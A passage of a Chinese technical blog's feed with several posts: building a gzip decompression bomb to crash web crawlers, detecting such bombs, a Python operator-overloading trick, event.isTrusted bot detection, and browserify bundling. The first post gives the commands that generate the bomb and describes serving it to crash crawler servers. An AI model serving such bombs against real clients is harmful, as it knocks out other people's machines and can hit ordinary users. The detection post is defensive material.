class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br></pre></td></tr></table></figure><p>我们可以用5个字符来表示：<code>192个1</code>。这就相当于把192个字符压缩成了5个字符，压缩率高达97.4%。</p><p>如果我们可以把一个1GB的文件压缩成1MB，那么对服务器来说，仅仅是返回了1MB的二进制数据，不会造成任何影响。但是对客户端或者爬虫来说，它拿到这个1MB的数据以后，就会在内存中把它还原成1GB的内容。这样一瞬间爬虫占用的内存就增大了1GB。如果我们再进一步增大这个原始数据，那么很容易就可以把爬虫所在的服务器内存全部沾满，轻者服务器直接杀死爬虫进程，重则爬虫服务器直接死机。</p><p>你别以为这个压缩比听起来很夸张，其实我们使用很简单的一行命令就可以生成这样的压缩文件。</p><p>如果你用的是Linux，那么请执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero bs=1M count=1000 | gzip &gt; boom.gz</span><br></pre></td></tr></table></figure><p>如果你的电脑是macOS，那么请执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero bs=1048576 count=1000 | gzip &gt; boom.gz</span><br></pre></td></tr></table></figure><p>执行过程如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124200621.png" alt></p><p>生成的这个<code>boom.gz</code>文件只有995KB。但是如果我们使用<code>gzip -d boom.gz</code>对这个文件解压缩，就会发现生成了一个1GB的<code>boom</code>文件，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124200731.png" alt></p><p>只要大家把命令里面的<code>count=1000</code>改成一个更大的数字，就能得到更大的文件。</p><p>我现在把<code>count</code>改成<code>10</code>，给大家做一个演示（不敢用1GB的数据来做测试，害怕我的Jupyter崩溃）。生成的<code>boom.gz</code>文件只有10KB：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124201125.png" alt></p><p>服务器返回一个10KB的二进制数据，没有任何问题。</p><p>现在我们用requests去请求这个接口，然后查看一下<code>resp</code>这个对象占用的内存大小：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220124201007.png" alt></p><p>可以看到，由于requests自动会对返回的数据解压缩，因此最终获得的resp对象竟然有10MB这么大。</p><p>如果大家想使用这个方法，一定要先确定这个请求是爬虫发的，再使用。否则被你干死的不是爬虫而是真实用户就麻烦了。</p><p>本文的写作过程中，参考了文章<a href="http://da.dadaaierer.com/?p=577" target="_blank" rel="noopener">网站gzip炸弹 – 王春伟的技术博客</a>，特别感谢原作者。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作为一个站长，你是不是对爬虫不胜其烦？爬虫天天来爬，速度又快，频率又高，服务器的大量资源被白白浪费。&lt;/p&gt;
&lt;p&gt;看这篇文章的你有福了，我们今天一起来报复一下爬虫，直接把爬虫的服务器给干死机。&lt;/p&gt;
    
    </summary>
    
      <category term="反爬虫" scheme="https://www.kingname.info/categories/%E5%8F%8D%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="反爬虫" scheme="https://www.kingname.info/tags/%E5%8F%8D%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：轻松排雷，爬虫让gzip炸弹变成哑炮</title>
    <link href="https://www.kingname.info/2022/03/06/kill-gzip-boom/"/>
    <id>https://www.kingname.info/2022/03/06/kill-gzip-boom/</id>
    <published>2022-03-06T15:15:59.000Z</published>
    <updated>2022-03-06T15:26:19.914Z</updated>
    
    <content type="html"><![CDATA[<p>在昨天的文章《<a href="https://mp.weixin.qq.com/s/Lzo6Pm09XsOqPkz3O91Mgg" target="_blank" rel="noopener">一日一技：反爬虫的极致手段，几行代码直接炸了爬虫服务器</a>》中，我讲到了后端如何使用gzip返回极高压缩率的文件，从而瞬间卡死爬虫。</p><p>大家都知道我的公众号风格，要<del>得罪</del>讨好就两边一起<del>得罪</del>讨好。昨天我帮了后端，今天我就帮帮爬虫。作为爬虫，如何避免踩中gzip炸弹？</p><p>最直接的方法，就是把你的爬虫隐藏起来，因为gzip炸弹只能在发现了爬虫以后使用，否则就会影响到正常用户。只要你的爬虫让网站无法发现，那么自然就不会踩中炸弹。</p><p>如果你没有把握隐藏爬虫，那么，请继续往下看。</p><a id="more"></a><p>查看gzip炸弹的URL返回的Headers，你会发现如下图所示的字段：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220125184230.png" alt></p><p>你只需要判断<code>resp.headers</code>中，是否有一个名为<code>content-encoding</code>，值包含<code>gzip</code>或<code>deflate</code>的字段。如果没有这个字段，或者值不含<code>gzip</code>、<code>deflate</code>那么你就可以放心，它大概率不是炸弹。</p><p>值得一提的是，当你不读取<code>resp.content</code>、<code>resp.text</code>的时候，Requests是不会擅自给你解压缩的，如下图所示。因此你可以放心查看Headers。：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220125184347.png" alt></p><p>那么，如果你发现网站返回的内容确实是<code>gzip</code>压缩后的内容了怎么办呢？这个时候，我们如何做到既不解压缩，又能获取到解压以后的大小？</p><p>如果你本地检查一个<code>.gz</code>文件，那么你可以使用命令<code>gzip -l xxx.gz</code>来查看它的头信息：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220125184943.png" alt></p><p>打印出来的数据中，第一个数字是压缩后的大小，第二个数字是解压以后的大小，第三个百分比是压缩率。这些信息是储存在压缩文件的头部信息中的，不用解压就能获取到。</p><p>那么当我使用Requests的时候，如何获得压缩后的二进制数据，防止它擅自解压缩？方法其实非常简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">print(resp.raw.read())</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220125185246.png" alt></p><p>此时可以看到，这个大小是压缩后的二进制数据的大小。现在，我们可以使用如下代码，在不解压的情况下，查询到解压缩后的文件大小：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">decompressed = resp.raw.read()</span><br><span class="line"><span class="keyword">with</span> gzip.open(io.BytesIO(decompressed), <span class="string">'rb'</span>) <span class="keyword">as</span> g:</span><br><span class="line">    g.seek(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    origin_size = g.tell()</span><br><span class="line">    print(origin_size)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220125185700.png" alt></p><p>打印出来的数字转成MB就是10MB，也就是我们昨天测试的解压后的文件大小。</p><p>使用这个方法，我们就可以在不解压的情况下，知道网站返回的gzip压缩数据的实际大小。如果发现实际尺寸大得离谱，那就可以确定是gzip炸弹了，赶紧把它丢掉。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在昨天的文章《&lt;a href=&quot;https://mp.weixin.qq.com/s/Lzo6Pm09XsOqPkz3O91Mgg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：反爬虫的极致手段，几行代码直接炸了爬虫服务器&lt;/a&gt;》中，我讲到了后端如何使用gzip返回极高压缩率的文件，从而瞬间卡死爬虫。&lt;/p&gt;
&lt;p&gt;大家都知道我的公众号风格，要&lt;del&gt;得罪&lt;/del&gt;讨好就两边一起&lt;del&gt;得罪&lt;/del&gt;讨好。昨天我帮了后端，今天我就帮帮爬虫。作为爬虫，如何避免踩中gzip炸弹？&lt;/p&gt;
&lt;p&gt;最直接的方法，就是把你的爬虫隐藏起来，因为gzip炸弹只能在发现了爬虫以后使用，否则就会影响到正常用户。只要你的爬虫让网站无法发现，那么自然就不会踩中炸弹。&lt;/p&gt;
&lt;p&gt;如果你没有把握隐藏爬虫，那么，请继续往下看。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="反爬虫" scheme="https://www.kingname.info/tags/%E5%8F%8D%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：8行炫技代码，知识点多得不得了</title>
    <link href="https://www.kingname.info/2022/03/06/knowledge-in-bad-code/"/>
    <id>https://www.kingname.info/2022/03/06/knowledge-in-bad-code/</id>
    <published>2022-03-06T15:15:43.000Z</published>
    <updated>2022-03-06T15:23:40.546Z</updated>
    
    <content type="html"><![CDATA[<p>我们今天来看一段炫技代码。它可以把任何能接收两个参数的函数定义成一个特殊的运算符。</p><a id="more"></a><p>例如，我们知道Python里面的<code>range</code>函数，最少可以接收1个参数，最多能够接收3个参数。当只有两个参数的时候，格式为<code>range(开始, 结束)</code>，从开始数字到结束数字逐次加1，左闭右开。使用今天的方法，可以把它的写法改为<code>开始 |到| 结束</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127191711.png" alt></p><p>又比如，<code>urllib.parse.urljoin</code>可以把域名和一个相对路径拼接起来: <code>urljoin(域名, 相对路径)</code>，我们也可以改写成如下图所示的格式：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127192252.png" alt></p><p>这种炫技有余，实用不足的功能是怎么实现的呢？其实原理非常简单，只有8行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Change</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></span><br><span class="line">        self.func = func</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__or__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.func(other)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__ror__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        self.func = partial(self.func, other)</span><br><span class="line">        <span class="keyword">return</span> self</span><br></pre></td></tr></table></figure><p>这里就涉及到一个盲点和两个真正的知识点。这个盲点就是，你可能以为<br><code>|到|</code>是一个字符，但是它是3个字符；你可能会把<code>|拼接|</code>看做一个整体，但是它实际上是3个部分：左边的<code>|</code>、<code>拼接</code>和右边的<code>|</code>。</p><p>我们把空格加上，就很明显了：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127194754.png" alt></p><p>两个真正的知识点，就是<code>__or__</code>和<code>__ror__</code>这两个魔术方法和偏函数<code>partial</code>。而<code>Change</code>本身就是一个普通的类而已，<code>__or__</code>和<code>__ror__</code>定义了这个类的实例在左侧遇到<code>|</code>时，右侧遇到<code>|</code>时的具体行为。</p><p>我们一个一个来讲。首先是<code>__or__</code>。它定义了实例的右侧遇到<code>|</code>时的具体行为。例如，我们用一个简单的代码来进行测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        self.num = num</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__or__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        print(<span class="string">f'我右边有一个东西，它是：<span class="subst">&#123;other&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">x = Test(<span class="number">100</span>)</span><br><span class="line">x | <span class="number">55</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127193556.png" alt></p><p>但如果你把竖线放在左边，他就会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127193742.png" alt></p><p>而<code>__ror__</code>就是用来定义<code>|</code>在实例左边的时候，它的行为：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127193858.png" alt></p><p>所以，我们最开始的例子中，<code>2 |到| 10</code>，实际上应该理解为：</p><ol><li><code>到</code>是<code>Change(range)</code>返回的实例</li><li><code>2 | 到</code>  生成一个中间对象，我们假设它是<code>x</code></li><li><code>x | 10</code> 生成结果</li></ol><p>在我们演示的例子中，<code>2 | 到</code>首先进入了<code>Change</code>类的<code>__ror__</code>方法中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__ror__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">    self.func = partial(self.func, other)</span><br><span class="line">    <span class="keyword">return</span> self</span><br></pre></td></tr></table></figure><p>其中，一开始的<code>self.func</code>就是我们在初始化实例<code>Change(range)</code>时传入的参数<code>range</code>。所以<code>partial(self.func, other)</code>等价于<code>partial(range, 2)</code>。关于偏函数<code>partial</code>，大家可以看我这篇文章：<a href="https://mp.weixin.qq.com/s/veP19kUQgnyiivDoJH8_9g" target="_blank" rel="noopener">偏函数：在Python中设定默认参数的另一种办法</a>。简单来说，使用偏函数，可以给一个真正的函数传一部分参数，过一会再补剩下的参数。</p><p>可能大家在日常的开发者，很少会让一个实例方法返回<code>self</code>。关于这个写法，大家可以看我的这一篇文章：<a href="https://mp.weixin.qq.com/s/Y689WhpOopHdI8hbCGcFMg" target="_blank" rel="noopener">一日一技：在Python里面实现链式调用</a>。也就是说，<code>1 | 到</code>返回的，依然是<code>Change</code>类的一个实例，我们简称它为<code>x</code>。这个实例的属性<code>self.func</code>的值是<code>partial(range, 2)</code>。</p><p>接下来，<code>x | 10</code>，调用的是<code>__or__</code>方法，于是，此时执行的是<code>partial(range, 2)(10)</code>。偏函数的参数补全了，于是它里面的<code>range</code>真正运行了起来，成为了<code>range(2, 10)</code>。</p><p>至此，这个<code>Change</code>类我们就解析透了。大家知道，在Python里面，魔术方法是有很多的，如果你不想用<code>|</code>，你还可以用其它的，例如：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127195758.png" alt></p><p>或者：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127195832.png" alt></p><p>或者：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127195904.png" alt></p><p>同时，这个<code>Change</code>类，你甚至可以直接当做装饰器来使用。任何能够接收两个参数的函数，都能使用这个装饰器。例如：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220127200446.png" alt></p><p>最后总结一下。大家都知道，我是非常反对在工作代码中炫技的，因为炫技的写法很难读，很难维护。今天这个炫技的方法，虽然我也不推荐大家用在工作中，但是它短短8行代码里面，包含了很多个知识点，这就值得大家玩一玩了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们今天来看一段炫技代码。它可以把任何能接收两个参数的函数定义成一个特殊的运算符。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>你以为的万能爬虫方法，其实一行代码就能识别！</title>
    <link href="https://www.kingname.info/2022/03/06/detect-js-click/"/>
    <id>https://www.kingname.info/2022/03/06/detect-js-click/</id>
    <published>2022-03-06T15:15:22.000Z</published>
    <updated>2022-03-06T15:24:52.501Z</updated>
    
    <content type="html"><![CDATA[<p>在以前的公众号中，我提到Selenium/Puppeteer/Pyppeteer有很多特征可以被网站检测到。于是，有些同学想到了另一个方法，就是自己写一个Chrome插件，在网站打开的时候，注入到页面中，然后通过这个注入的JavaScript代码来操作页面，获取数据。</p><p>这个方法理论上说是万能的，因为注入的JavaScript能够获取当前Dom树，任何接口签名都无法拦截到自己注入的JavaScript代码，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220208204228.png" alt></p><a id="more"></a><p>而Chrome插件访问自己的服务器后端是没有跨域问题的，完全可以让插件获取到数据以后，发送给自己的服务器，这样就可以把数据收入囊中了。</p><p>你还可以通过JavaScript自动点击按钮，实现自动翻页。所以你只需要把网页打开，启动插件，然后他就能自动刷新，自动获取数据了。</p><p>这个方法看起来非常万能，而且无法被防御……</p><p>事实真的是这样吗？我写了一个Demo来做测试。Demo页面长下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220208204724.png" alt></p><p>当我手动点击<code>点击我</code>按钮的时候，会弹出一个框：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220208204814.png" alt></p><p>现在，我使用JavaScript来选择这个按钮，然后点击它：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220208204936.png" alt></p><p>为什么网站知道我在用JavaScript点击了按钮呢？其实只要我给你看这个页面的HTML，你就知道了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test Event<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">"spider"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>你这个狗爬虫<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"check"</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> example2 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">'#app'</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="javascript">                spider: <span class="literal">false</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line"><span class="javascript">                check: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span></span><br><span class="line">                    if (event.isTrusted) &#123;</span><br><span class="line"><span class="javascript">                        alert(<span class="string">'主人你好，欢迎回家！'</span>)</span></span><br><span class="line"><span class="javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">this</span>.spider = <span class="literal">true</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关键的点就是这个<code>event.isTrusted</code>。它是浏览器的一个功能，如果这个事件是人通过鼠标点击的，那么它是<code>true</code>。如果事件是通过JavaScript触发的，那么它是<code>false</code>。</p><p>关于这个属性，你可以查看<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Event/isTrusted" target="_blank" rel="noopener">Event.isTrusted - Web API 接口参考 | MDN</a>。这个例子里面，我用的是Vue来操作页面，但实际上<code>event</code>是浏览器的特性，使用原生JavaScript也可以实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"button"</span>).addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.isTrusted) &#123;</span><br><span class="line">      alert(<span class="string">'主人你好，欢迎回家！'</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.spider = <span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>那么如何绕过这个<code>event.isTrusted</code>呢？其实很简单，你使用Selenium/Puppeteer，天然就能绕过它。</p><p>看到这里，大家肯定发现一个很好笑的问题，Selenium/Puppeteer不能解决的问题，用JavaScript轻松就能解决。但JavaScript解决不了的问题，用Selenium/Puppeteer又完全没有问题。</p><p>这就像是猫吃老鼠，老虎吃猫，大象吃老虎，但是老鼠可以吃大象。寸有所长，必有所短，寸有所短，也可能有所长。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在以前的公众号中，我提到Selenium/Puppeteer/Pyppeteer有很多特征可以被网站检测到。于是，有些同学想到了另一个方法，就是自己写一个Chrome插件，在网站打开的时候，注入到页面中，然后通过这个注入的JavaScript代码来操作页面，获取数据。&lt;/p&gt;
&lt;p&gt;这个方法理论上说是万能的，因为注入的JavaScript能够获取当前Dom树，任何接口签名都无法拦截到自己注入的JavaScript代码，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220208204228.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="反爬虫" scheme="https://www.kingname.info/categories/%E5%8F%8D%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
      <category term="反爬虫" scheme="https://www.kingname.info/tags/%E5%8F%8D%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：如何在浏览器中使用npm包？</title>
    <link href="https://www.kingname.info/2022/03/06/use-npm-package-in-browser/"/>
    <id>https://www.kingname.info/2022/03/06/use-npm-package-in-browser/</id>
    <published>2022-03-06T15:15:09.000Z</published>
    <updated>2022-03-06T15:21:16.742Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，Python的第三方库一般可以使用pip来安装。如果代码比较简单，我们甚至可以把第三方库的代码复制下来，放到项目里面导入。</p><p>但由于JavaScript生态里面，有Node.js这个东西，这就导致第三方库有两种不同的导入方式。如果我们要做一个网站，我们通常会在HTML中，使用<code>&lt;script&gt;</code>标签引入.js文件，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样导入了.js文件以后，里面的代码在网页加载完成后就会运行。</p><p>但在Node.js生态里面，第三方包一般需要使用<code>npm</code>安装，然后在代码里面通过<code>require</code>导入。最后再用webpack打包编译成能直接在浏览器中运行的JavaScript代码。</p><p>如果我找到一个第三方的包，它只提供了npm版本，没有提供直接在浏览器中导入的版本怎么办？</p><a id="more"></a><p>举个例子，我想把<code>CSS Selector</code>转换成<code>XPath</code>。在Github上面，可以搜索到很多这种第三方包，例如：<a href="https://github.com/featurist/css-to-xpath" target="_blank" rel="noopener">featurist/css-to-xpath: Convert CSS selectors to XPaths, in JavaScript</a> 或者<a href="https://github.com/sergeidyga/cssxpath" target="_blank" rel="noopener">sergeidyga/cssxpath</a>。</p><p>但你会发现，这些包都只提供npm安装的版本，没有办法直接在浏览器中通过<script>标签导入。如果我想做一个如下图所示的简单网页，难道我还要用webpack去编译？</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220216193906.png" alt=""></p><p>在浏览器能运行的JavaScript中，<code>require</code>关键字都是不存在的，如下图所示。因此，我们甚至没有办法把包里面的代码复制出来用：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220216192852.png" alt=""></p><p>遇到这种问题怎么办呢？难道我们需要人工一行一行去改写这个包里面的代码让它能直接在浏览器运行？还是必须用webpack来打包编译？其实我们有一个方法，可以把npm版本的包转换成浏览器能运行的包。虽然这个办法还是要依赖Node.js和npm，但是非常简单。你完全不需要知道webpack是什么就可以完成。</p><p>以<code>cssxpath</code>为例，我们首先用npm安装它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i cssxpath</span><br></pre></td></tr></table></figure><p>然后，我们写一个<code>main.js</code>文件，只需要两行代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cssxpath = <span class="built_in">require</span>(<span class="string">'css-to-xpath'</span>)</span><br><span class="line"><span class="built_in">window</span>.cssxpath = cssxpath</span><br></pre></td></tr></table></figure><p>接下来，使用<code>npm</code>全局安装<code>browserify</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g browserify</span><br></pre></td></tr></table></figure><p>安装完成以后，执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify main.js -o bundle.js</span><br></pre></td></tr></table></figure><p>命令运行完成以后，会生成一个<code>bundle.js</code>文件。现在我们就可以把这个文件和HTML代码放在一起，通过<code>&lt;script&gt;</code>标签导入了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 